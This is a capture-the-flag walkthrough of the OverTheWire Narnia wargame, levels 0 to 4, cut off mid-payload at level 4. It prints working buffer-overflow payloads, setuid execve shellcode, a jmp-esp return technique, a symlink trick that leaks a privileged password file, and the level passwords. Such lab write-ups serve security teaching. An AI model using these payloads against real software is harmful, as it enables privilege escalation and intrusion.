# Narnia OverTheWire Wargame

## narnia0

After connecting to the specific level with `ssh` by typing
    *ssh narnia0@narnia.labs.overthewire.org -p 2226* 
with password 
    *narnia0*

one can find the disassembled code source below: 

    (gdb) set disassembly-flavor intel
    (gdb) set pagination off 
    (gdb) 
    (gdb) disas main 
    Dump of assembler code for function main:
    0x080491c6 <+0>:	push   ebp
    0x080491c7 <+1>:	mov    ebp,esp
    0x080491c9 <+3>:	push   ebx
    0x080491ca <+4>:	sub    esp,0x18
    0x080491cd <+7>:	mov    DWORD PTR [ebp-0x8],0x41414141 <-- (1)
    0x080491d4 <+14>:	push   0x804a008
    0x080491d9 <+19>:	call   0x8049060 <puts@plt>
    0x080491de <+24>:	add    esp,0x4
    0x080491e1 <+27>:	push   0x804a03b
    0x080491e6 <+32>:	call   0x8049040 <printf@plt>
    0x080491eb <+37>:	add    esp,0x4
    0x080491ee <+40>:	lea    eax,[ebp-0x1c]
    0x080491f1 <+43>:	push   eax
    0x080491f2 <+44>:	push   0x804a051
    0x080491f7 <+49>:	call   0x80490a0 <__isoc99_scanf@plt>
    0x080491fc <+54>:	add    esp,0x8
    0x080491ff <+57>:	lea    eax,[ebp-0x1c]
    0x08049202 <+60>:	push   eax
    0x08049203 <+61>:	push   0x804a056
    0x08049208 <+66>:	call   0x8049040 <printf@plt>
    0x0804920d <+71>:	add    esp,0x8
    0x08049210 <+74>:	push   DWORD PTR [ebp-0x8]
    0x08049213 <+77>:	push   0x804a05f
    0x08049218 <+82>:	call   0x8049040 <printf@plt>
    0x0804921d <+87>:	add    esp,0x8
    0x08049220 <+90>:	cmp    DWORD PTR [ebp-0x8],0xdeadbeef <-- (2)
    0x08049227 <+97>:	jne    0x804924e <main+136>
    0x08049229 <+99>:	call   0x8049050 <geteuid@plt>
    0x0804922e <+104>:	mov    ebx,eax
    0x08049230 <+106>:	call   0x8049050 <geteuid@plt>
    0x08049235 <+111>:	push   ebx
    0x08049236 <+112>:	push   eax
    0x08049237 <+113>:	call   0x8049090 <setreuid@plt>
    0x0804923c <+118>:	add    esp,0x8
    0x0804923f <+121>:	push   0x804a06c
    0x08049244 <+126>:	call   0x8049070 <system@plt>
    0x08049249 <+131>:	add    esp,0x4
    0x0804924c <+134>:	jmp    0x8049262 <main+156>
    0x0804924e <+136>:	push   0x804a074
    0x08049253 <+141>:	call   0x8049060 <puts@plt>
    0x08049258 <+146>:	add    esp,0x4
    0x0804925b <+149>:	push   0x1
    0x0804925d <+151>:	call   0x8049080 <exit@plt>
    0x08049262 <+156>:	mov    eax,0x0
    0x08049267 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
    0x0804926a <+164>:	leave
    0x0804926b <+165>:	ret
    End of assembler dump.

As one can see, at (1) an assignment of the address referenced by ebp-0x8 
is happening with value 0x41414141 and at (2) this specific value is checked 
against 0xdeadbeef. If the comparison is true, a shell is spawned, which is 
the flow we need to trigger. So [ebp-0x8] has to contain 0xdeadbeef.

After running the program inside gdb and providing this input

    AAAABBBBCCCCDDDDEEEEFFFFGGGG

we notice that the value inside ebp-0x8 is 0x46464646 which is `FFFF`. Thus, our
padding is `lengthOf("AAAABBBBCCCCDDDDEEEE")` which is equal to 20. After that, the 
`deadbeef` bytes need to be appended, in order to trigger the shell spawning. 
The below line of shell code aids us for this purpose.

    (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;)

Its output need to be provided as input to the program `narnia0`. So, after running

    narnia0@gibson:/narnia$ mkdir /tmp/testDirectory && touch /tmp/testDirectory/exploit0.sh
    narnia0@gibson:/narnia$ echo "(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;)" > /tmp/testDirectory/exploit0.sh
    narnia0@gibson:/narnia$ chmod +x /tmp/testDirectory/exploit0.sh
    narnia0@gibson:/narnia$ /tmp/testDirectory/exploit0.sh | ./narnia0 
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
    val: 0xdeadbeef
    id
    uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
    cat /etc/narnia_pass/narnia1
    WDcYUTG5ul

Password: **WDcYUTG5ul**


## narnia1

After connecting to the specific level with `ssh` by typing
    *ssh narnia1@narnia.labs.overthewire.org -p 2226* 
with password 
    *WDcYUTG5ul*

one can find the code for `narnia1` binary right below:

    #include <stdio.h>

    int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
            printf("Give me something to execute at the env-variable EGG\n");
            exit(1); /*And then exit*/
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
        ret(); /*Execute ret*/

        return 0;
    }

This urges us to put some shellcode inside the `EGG` environment variable, in 
order to be executed. Firstly, we need to find the system specifications.

    narnia1@gibson:/narnia$ uname -a
    Linux gibson 6.8.0-1010-aws #10-Ubuntu SMP Thu Jun 13 17:36:15 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

Thus, we are looking for a x86_64 shellcode (can be found at [REF_1]).
After exporting the `EGG` variable with the correct shellcode value, and spawning `narnia1`,
one can grab a shell with `narnia2` privileges and retrieve the password for the next level.

    narnia1@gibson:/narnia$ export EGG=$(echo -ne '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')
    narnia1@gibson:/narnia$ ./narnia1 
    Trying to execute EGG!
    bash-5.2$ whoami
    narnia2
    bash-5.2$ cat /etc/narnia_pass/narnia2
    5agRAXeBdG

Password: **5agRAXeBdG**


## narnia2

After connecting to the specific level with `ssh` by typing
    *ssh narnia2@narnia.labs.overthewire.org -p 2226* 
with password 
    *5agRAXeBdG*

one can find the `narnia2` source code down below: 

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
            printf("Usage: %s argument\n", argv[0]);
            exit(1);
        }
        strcpy(buf,argv[1]);
        printf("%s", buf);

        return 0;
    }

The vulnerability here is obvious; `argv[1]` is the attacker input and is being 
copied unfiltered and without any length checks to `buf[128]`. With attacker 
input greater than 128, one can easily crash the program and inspect it with gdb.

The following snippet shows the disassembled code for the main function in gdb.

    (gdb) set disassembly-flavor intel
    (gdb) set pagination off
    (gdb) disas main 
    Dump of assembler code for function main:
    0x08049186 <+0>:	push   ebp
    0x08049187 <+1>:	mov    ebp,esp
    0x08049189 <+3>:	add    esp,0xffffff80
    0x0804918c <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
    0x08049190 <+10>:	jne    0x80491ac <main+38>
    0x08049192 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
    0x08049195 <+15>:	mov    eax,DWORD PTR [eax]
    0x08049197 <+17>:	push   eax
    0x08049198 <+18>:	push   0x804a008
    0x0804919d <+23>:	call   0x8049040 <printf@plt>
    0x080491a2 <+28>:	add    esp,0x8
    0x080491a5 <+31>:	push   0x1
    0x080491a7 <+33>:	call   0x8049060 <exit@plt>
    0x080491ac <+38>:	mov    eax,DWORD PTR [ebp+0xc]
    0x080491af <+41>:	add    eax,0x4
    0x080491b2 <+44>:	mov    eax,DWORD PTR [eax]
    0x080491b4 <+46>:	push   eax
    0x080491b5 <+47>:	lea    eax,[ebp-0x80]
    0x080491b8 <+50>:	push   eax
    0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>
    0x080491be <+56>:	add    esp,0x8
    0x080491c1 <+59>:	lea    eax,[ebp-0x80]
    0x080491c4 <+62>:	push   eax
    0x080491c5 <+63>:	push   0x804a01c
    0x080491ca <+68>:	call   0x8049040 <printf@plt>
    0x080491cf <+73>:	add    esp,0x8
    0x080491d2 <+76>:	mov    eax,0x0
    0x080491d7 <+81>:	leave
    0x080491d8 <+82>:	ret

After running the program with this input (length 144)

    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111222233334444555566667777888899990000

we can identify where the Segmentation Fault occured.

    (gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111222233334444555566667777888899990000
    Starting program: /narnia/narnia2 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111222233334444555566667777888899990000
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Program received signal SIGSEGV, Segmentation fault.
    0x38383838 in ?? ()
    (gdb) info reg 
    eax            0x0                 0
    ecx            0x0                 0
    edx            0x0                 0
    ebx            0xf7fade34          -134554060
    esp            0xffffd210          0xffffd210
    ebp            0x37373737          0x37373737
    esi            0xffffd2d0          -11568
    edi            0xf7ffcb60          -134231200
    eip            0x38383838          0x38383838
    ...
    ...

As we can see from the above snippet, program crashed when $eip = 0x38383838, which
means it tried to return to the address 0x38383838 and didn't find anything there.
So this means that the return pointer can hold an attacker controlled value. With 
the aid of a python interpreter, one can easily find out that 0x38 is the '8' character.

    >>> chr(0x38)
    '8'

Thus, our padding to reach the return pointer when overflowing the buffer should be this

    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ1111222233334444555566667777

and has length 132 bytes. The payload's length should be 132 + 4 (for the return address), 
meaning 136 bytes. Because of the fact the we need to return inside a stack address for 
the purpose of hitting the shellcode, and this requires a guessing of this specific address, 
a simple exploitation strategy could be overflowing the buffer just before it touches the 
return pointer, find a "jump $esp" instruction inside the loaded libc library (which 
actually pops $esp and jumps there), followed by shellcode with setuid setting.
So instead of redirecting execution, we return to a "jmp $esp" intstruction which will be 
executed. This way our exploit becomes more reliable, because it doesn't require any guessings.
The snippet below can show how one can find the opcode (0xffe4) of "jmp $esp" inside gdb. 

    (gdb) run $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43")
    Starting program: /narnia/narnia2 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43")
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Program received signal SIGSEGV, Segmentation fault.
    0x43434343 in ?? ()
    (gdb) info proc mappings 
    process 1724309
    Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0x8048000  0x8049000     0x1000        0x0  r--p   /narnia/narnia2
        0x8049000  0x804a000     0x1000     0x1000  r-xp   /narnia/narnia2
        0x804a000  0x804b000     0x1000     0x2000  r--p   /narnia/narnia2
        0x804b000  0x804c000     0x1000     0x2000  rw-p   /narnia/narnia2
        0x804c000  0x806e000    0x22000        0x0  rw-p   [heap]
        0xf7d7d000 0xf7da0000    0x23000        0x0  r--p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7da0000 0xf7f27000   0x187000    0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7f27000 0xf7fac000    0x85000   0x1aa000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7fac000 0xf7fae000     0x2000   0x22f000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7fae000 0xf7faf000     0x1000   0x231000  rw-p   /usr/lib/i386-linux-gnu/libc.so.6
        0xf7faf000 0xf7fb9000     0xa000        0x0  rw-p   
        0xf7fc1000 0xf7fc3000     0x2000        0x0  rw-p   
        0xf7fc3000 0xf7fc7000     0x4000        0x0  r--p   [vvar]
        0xf7fc7000 0xf7fc9000     0x2000        0x0  r-xp   [vdso]
        0xf7fc9000 0xf7fca000     0x1000        0x0  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7fca000 0xf7fed000    0x23000     0x1000  r-xp   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7fed000 0xf7ffb000     0xe000    0x24000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7ffb000 0xf7ffd000     0x2000    0x31000  r--p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xf7ffd000 0xf7ffe000     0x1000    0x33000  rw-p   /usr/lib/i386-linux-gnu/ld-linux.so.2
        0xfffdd000 0xffffe000    0x21000        0x0  rwxp   [stack]
    (gdb) find /b 0xf7da0000, 0xf7f27000, 0xff, 0xe4 
    0xf7ea395d <__GI_init_module+45>
    1 pattern found.

The address "0xf7ea395d" is where we need to return and after that one should 
append their shellcode. Now, outside gdb one can execute, the following command 
in order to spawn a shell and grab the password for the next level.

    narnia2@gibson:~$ /narnia/narnia2 $(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x5d\x39\xea\xf7\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")
    $ whoami
    narnia3
    $ cat /etc/narnia_pass/narnia3
    2xszzNl6uG

**Note**: The shellcode had to be changed in order to get the uid of the user 
executing the binary and then set it for the owner of the shell binary that will 
be spawned [REF_2].

Password: **2xszzNl6uG**


## narnia3

After connecting to the specific level with `ssh` by typing
    *ssh narnia3@narnia.labs.overthewire.org -p 2226* 
with password 
    *2xszzNl6uG*

one can find the source code of `narnia4` binary which is shown below.

    #include <stdio.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>

    int main(int argc, char **argv){
        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
            printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
            exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
            printf("error opening %s\n", ofile);
            exit(-1);
        }

        if((ifd = open(ifile, O_RDONLY)) < 0 ){
            printf("error opening %s\n", ifile);
            exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);
        exit(1);

    }

The vulnerability lies in the `strcpy` call where argv[1] is copied unfiltered
and without length checks in the variable `ifile`, which has length 32 bytes.
After inspecting with gdb, one can actually figure out what is happening when 
we overflow this buffer with 31 `A`s.

    Breakpoint 3, 0x0804921a in main ()
    (gdb) x/32wx $esp 
    0xffffd218:	0xffffd240	0xffffd4d9	0xf7ffcfe8	0x00000018
    0xffffd228:	0x00000000	0xffffdfe8	0xf7fc7570	0xf7fc7000
    0xffffd238:	0x00000000	0x00000000	0x41414141	0x41414141
    0xffffd248:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd258:	0x41414141	0x00414141	0x7665642f	0x6c756e2f
    0xffffd268:	0x0000006c	0x00000000	0x00000000	0x00000000
    0xffffd278:	0x00000000	0xf7da1cb9	0x00000002	0xffffd334
    0xffffd288:	0xffffd340	0xffffd2a0	0xf7fade34	0x080490dd
    (gdb) x $ebp 
    0xffffd278:	0x00000000
    (gdb) x/s $ebp-0x38  
    0xffffd240:	'A' <repeats 31 times>
    (gdb) x/s $ebp-0x18  
    0xffffd260:	"/dev/null"

The string `/dev/null` which is the output file of the contents of argv[1], is 
located in memory right after the attacker controlled input. This urges the attacker
to provide an input of 36 bytes, overwriting the output file, which he/she could 
control.

After creating a temporaty test file for the output under /tmp inside the server, 
and running the binary with the `strace` tool for tracing all the system calls and 
with argv[1] to be equal to the attacker input, one can see from the snippet below, 

    narnia3@gibson:/tmp/tsos$ touch lala
    narnia3@gibson:/tmp/tsos$ chmod 777 lala
    narnia3@gibson:/tmp/tsos$ ls -l
    total 0
    -rwxrwxrwx 1 narnia3 narnia3 0 Jul 23 12:23 lala
    narnia3@gibson:/tmp/tsos$ strace /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala
    execve("/narnia/narnia3", ["/narnia/narnia3", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...], 0x7fffffffe208 /* 36 vars */) = 0
    [ Process PID=1845420 runs in 32 bit mode. ]
    brk(NULL)                               = 0x804c000
    fcntl64(0, F_GETFD)                     = 0
    fcntl64(1, F_GETFD)                     = 0
    fcntl64(2, F_GETFD)                     = 0
    mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fc1000
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
    statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=31643, ...}) = 0
    mmap2(NULL, 31643, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fb9000
    close(3)                                = 0
    openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
    read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0O\2\0004\0\0\0"..., 512) = 512
    statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2313128, ...}) = 0
    mmap2(NULL, 2341052, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d7d000
    mmap2(0xf7da0000, 1601536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0xf7da0000
    mmap2(0xf7f27000, 544768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xf7f27000
    mmap2(0xf7fac000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22f000) = 0xf7fac000
    mmap2(0xf7faf000, 39100, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7faf000
    close(3)                                = 0
    set_thread_area({entry_number=-1, base_addr=0xf7fc24c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
    set_tid_address(0xf7fc2528)             = 1845420
    set_robust_list(0xf7fc252c, 12)         = 0
    rseq(0xf7fc2960, 0x20, 0, 0x53053053)   = 0
    mprotect(0xf7fac000, 8192, PROT_READ)   = 0
    mprotect(0xf7ffb000, 8192, PROT_READ)   = 0
    ugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
    munmap(0xf7fb9000, 31643)               = 0
    openat(AT_FDCWD, "lala", O_RDWR)        = 3 (2)
    openat(AT_FDCWD, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala", O_RDONLY) = -1 ENOENT (No such file or directory) (3)
    statx(1, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFCHR|0620, stx_size=0, ...}) = 0
    getrandom("\x86\x0a\x46\xd8", 4, GRND_NONBLOCK) = 4
    brk(NULL)                               = 0x804c000
    brk(0x806d000)                          = 0x806d000
    brk(0x806e000)                          = 0x806e000
    write(1, "error opening AAAAAAAAAAAAAAAAAA"..., 51error opening AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala
    ) = 51
    exit_group(-1)                          = ?
    +++ exited with 255 +++

that at (2), the program tried to open the `lala` file which is what the attacker provided.
Also, at (3), the program tried to open a file that doesn't exist. So, by creating a symlink 
to this specific attacker input for the password file of `narnia4`, one should be able to 
leak the password of the latter inside the attacker controlled file created before.

    narnia3@gibson:/tmp/tsos$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala 
    narnia3@gibson:/tmp/tsos$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala
    copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlala to a safer place... (lala)
    narnia3@gibson:/tmp/tsos$ cat lala
    iqNWNk173q

Password: **iqNWNk173q**


## narnia4

After connecting to the specific level with `ssh` by typing
    *ssh narnia4@narnia.labs.overthewire.org -p 2226* 
with password 
    *iqNWNk173q*

one can find the source code for `narnia4` binary right below.

    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <ctype.h>

    extern char **environ;

    int main(int argc,char **argv){
        int i;
        char buffer[256];

        for(i = 0; environ[i] != NULL; i++)
            memset(environ[i], '\0', strlen(environ[i]));

        if(argc>1)
            strcpy(buffer,argv[1]);

        return 0;
    }

The vulnerability lies in `strcpy` call where argv[1] is copied inside `buffer`
without any checks being taken into considerations. By providing a payload greater
than 256 maybe we could be able to overwrite stuff inside the stack, including the 
return address (where main returns after executing). After inspecting with gdb and 
setting a break point right after the strcpy call, 

    (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Starting program: /narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

    Breakpoint 1, 0x080491fe in main ()
    (gdb) x/96wx $esp 
    0xffffd09c:	0xffffd0a4	0xffffd3f3	0x41414141	0x41414141
    0xffffd0ac:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd0bc:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd0cc:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd0dc:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd0ec:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd0fc:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd10c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd11c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd12c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd13c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd14c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd15c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd16c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd17c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd18c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd19c:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd1ac:	0x41414141	0x41414141	0x41414141	0xff004141
    0xffffd1bc:	0xffffd1d0	0xf7fade34	0x0804909d	0x00000002
    0xffffd1cc:	0xffffd264	0xf7fade34	0xffffd270	0xf7ffcb60
    0xffffd1dc:	0x00000000	0x5222dd1b	0x19b9570b	0x00000000
    0xffffd1ec:	0x00000000	0x00000000	0xf7ffcb60	0x00000000
    0xffffd1fc:	0xf69f5200	0xf7ffda20	0xf7da1c46	0xf7fade34
    0xffffd20c:	0xf7da1d7c	0xf7fc9af4	0x0804b0d8	0x00000000
    (gdb) x $ebp 
    0xffffd1a8:	0x41414141
    (gdb) x $ebp + 4
    0xffffd1ac:	0x41414141
    (gdb) c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

one can clearly see that the return address can be overwritten by using attacker
input with the length of 278. After investigating a bit more, it's quite obvious
that we need 278 - 14 = 264 bytes until we hit the return address. So our payload
should look like:

    padding (264) + return address (4) = 268 bytes

The shellcode we are going to be using is 35 bytes long so our malicious input 
could look like this: 

    nops (200) + shellcode (35) + nops (31) + stack address (4) = 268 bytes

After running the program outside gdb like below 

    narnia4@gibson:~$ /narnia/narnia4 $(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89